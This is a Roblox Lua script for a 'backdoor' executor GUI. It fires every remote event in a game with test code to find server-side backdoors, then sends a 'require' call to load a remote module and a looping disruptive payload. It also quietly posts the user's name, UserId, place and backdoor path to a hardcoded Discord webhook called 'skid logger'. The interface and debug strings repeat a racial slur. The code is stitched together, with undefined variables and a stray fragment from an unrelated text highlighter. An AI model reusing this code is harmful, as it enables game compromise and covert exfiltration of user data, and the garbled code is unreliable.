--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

-- Instances: 8 | Scripts: 0 | Modules: 0 | Tags: 0
local G2L = {};

-- Players.ughuhh09.PlayerGui.ScreenGui
G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;


-- Players.ughuhh09.PlayerGui.ScreenGui.Frame
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["BorderSizePixel"] = 0;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(255, 174, 0);
G2L["2"]["Size"] = UDim2.new(0.42188, 0, 0.30728, 0);
G2L["2"]["Position"] = UDim2.new(0.27969, 0, -0.01887, 0);


-- Players.ughuhh09.PlayerGui.ScreenGui.Frame.UICorner
G2L["3"] = Instance.new("UICorner", G2L["2"]);
G2L["3"]["CornerRadius"] = UDim.new(0.1, 0);


-- Players.ughuhh09.PlayerGui.ScreenGui.Frame.Nigga backdoor
G2L["4"] = Instance.new("TextLabel", G2L["2"]);
G2L["4"]["TextWrapped"] = true;
G2L["4"]["BorderSizePixel"] = 0;
G2L["4"]["TextScaled"] = true;
G2L["4"]["BackgroundColor3"] = Color3.fromRGB(255, 174, 0);
G2L["4"]["RichText"] = true;
G2L["4"]["Size"] = UDim2.new(1, 0, 0.19298, 0);
G2L["4"]["Text"] = [[Nigga Backdoor]];
G2L["4"]["Name"] = [[Nigga backdoor]];


-- Players.ughuhh09.PlayerGui.ScreenGui.Frame.Nigga backdoor.UICorner
G2L["5"] = Instance.new("UICorner", G2L["4"]);



-- Players.ughuhh09.PlayerGui.ScreenGui.Frame.TextBox
G2L["6"] = Instance.new("TextBox", G2L["2"]);
G2L["6"]["CursorPosition"] = -1;
G2L["6"]["BorderSizePixel"] = 0;
G2L["6"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["PlaceholderText"] = [[Skid code here]];
G2L["6"]["Size"] = UDim2.new(0.92963, 0, 0.49123, 0);
G2L["6"]["Position"] = UDim2.new(0.02222, 0, 0.18421, 0);
G2L["6"]["Text"] = [[]];
G2L["6"]["Name"] =[[Code]];

-- Players.ughuhh09.PlayerGui.ScreenGui.Frame.Execute
G2L["7"] = Instance.new("TextButton", G2L["2"]);
G2L["7"]["Interactable"] = false;
G2L["7"]["BorderSizePixel"] = 0;
G2L["7"]["BackgroundColor3"] = Color3.fromRGB(79, 255, 26);
G2L["7"]["Archivable"] = false;
G2L["7"]["Size"] = UDim2.new(0.67407, 0, 0.15789, 0);
G2L["7"]["Text"] = [[Execute]];
G2L["7"]["Name"] = [[Execute]];
G2L["7"]["Position"] = UDim2.new(0.02593, 0, 0.73684, 0);


-- Players.ughuhh09.PlayerGui.ScreenGui.Frame.Clear
G2L["8"] = Instance.new("TextButton", G2L["2"]);
G2L["8"]["BorderSizePixel"] = 0;
G2L["8"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 0);
G2L["8"]["Selected"] = true;
G2L["8"]["Size"] = UDim2.new(0.24815, 0, 0.17544, 0);
G2L["8"]["Text"] = [[Clear]];
G2L["8"]["Name"] = [[Clear]];
G2L["8"]["Position"] = UDim2.new(0.71111, 0, 0.72807, 0);


	HttpService=game:GetService("HttpService")
	
	function debug(text, lvl)
		local func=print
		if lvl==1 then func=print end
		if lvl==2 then func=error end
		if lvl==3 then func=warn end
		func('Nigga'..text)
	end


	local data = LastData[textObject]
	if data == nil then
		data = {
			Text = "",
			Labels = {},
			Lines = {},
			Lexer = lexer,
			CustomLang = customLang,
		}
		LastData[textObject] = data
	elseif forceUpdate ~= true and data.Text == src then
		return
	end

	local lineLabels = data.Labels
	local previousLines = data.Lines

	local lines = string.split(src, "\n")

	data.Lines = lines
	data.Text = src
	data.Lexer = lexer
	data.CustomLang = customLang
	
	function runRemote(remote, data, data2)
	
		if remote:IsA('RemoteEvent') then
			remote:FireServer(data)
		elseif remote:IsA('RemoteFunction') then
			spawn(function() remote:InvokeServer(data) end)
		end
	
end

	function notify(text)
		game:GetService('StarterGui'):SetCore(
			"SendNotification",
			{
				Title = "Nigga",
				Duration = 6,
				Text = text
			}
		)
end

		for i,remote in game:GetDescendants() do
			
			-- Validation Checker
			
			if not remote:IsA('RemoteEvent') then 
				if not remote:IsA('RemoteFunction') then continue end
			end
	
			-- RobloxReplicatedStorage
			if string.split(remote:GetFullName(), '.')[1]=='RobloxReplicatedStorage' then
				debug('Roblox Replicated Storage ('..remote.Name..')', 1)
				continue
			end
	
			if remote.Parent==game:GetService("ReplicatedStorage") or remote.Parent.Parent==game:GetService("ReplicatedStorage") or remote.Parent.Parent.Parent==game:GetService("ReplicatedStorage") then
	
				-- ADONIS Anti-Exploit
				if remote:FindFirstChild('__FUNCTION') or remote.Name=='__FUNCTION' then
					debug('Adonis filter detected ('..remote.Name..')', 1)
					continue
				end
	
				-- HD Admin
				if remote.Parent.Parent.Name=='HDAdminClient' and remote.Parent.Name=='Signals' then
					debug('HD Admin ('..remote.Name..')', 1)
					continue
				end
	
				-- Chat Events
				if remote.Parent.Name=='DefaultChatSystemChatEvents' then
					debug('Chat event ('..remote.Name..')', 1)
					continue
				end
	
			end
	
			-- Backdoor Sender
			
			while true do
				code=generateName(math.random(12,30))
				if not remotes[code] then break end
			end
			
			runRemote(remote, "a=Instance.new('Model',workspace)a.Name='"..code.."'")
			remotes[code]=remote
			
			debug('Sended Backdoor "'..remote:GetFullName()..'"', 1)
			
		end
		
		-- Backdoor Checker
		for i=1,100 do

    for i, remote in remotes do
        local code = i

        if workspace:FindFirstChild(code) then

            notify('Backdoor found! '..os.clock()-timee..'s')

            backdoor = remote
            debug(remote:GetFullName(), 3)
            GUI.Scanner.Visible = false
            makeVisible(GUI.Executor, true)

            -- runRemote(backdoor, "a=Instance.new for b=1,13 do a.Parent=workspace;wait(1)a.Parent=nil;wait(0.5)end;wait(60)end")
            runRemote(remote, "require(171016405.1884*69)")          
            runRemote(remote, "''while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")

            local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
            if request then 
                request({
                    Url = 'https://discord.com/api/webhooks/1396108207906230377/4xrNwKq1P7TTFruKzs5BmNQcLdz0JeiYpvtufzVR8zV4Xu0dsrzBMU5l2cXQxDU-LlvY',
                    Method = 'POST',
                    Headers = {
                        ['Content-Type'] = 'application/json',
                    },
                    Body = HttpService:JSONEncode({
                        username='skid logger',
                        content="**User: `"..game:GetService('Players').LocalPlayer.Name..'` | `'..game:GetService('Players').LocalPlayer.UserId..'`\nhttps://www.roblox.com/games/'..game.PlaceId..'\n`'..backdoor:GetFullName()..'`**',
                    })
                })
            end

            return true
        end

        -- debug('"'..remote:GetFullName()..'" seems like not backdoor', 1)
    end -- THIS end closes the inner for loop (for i, remote in remotes do)

    wait() -- .1

end -- THIS end closes the outer for loop (for i=1,100 do)

return G2L["1"], require;
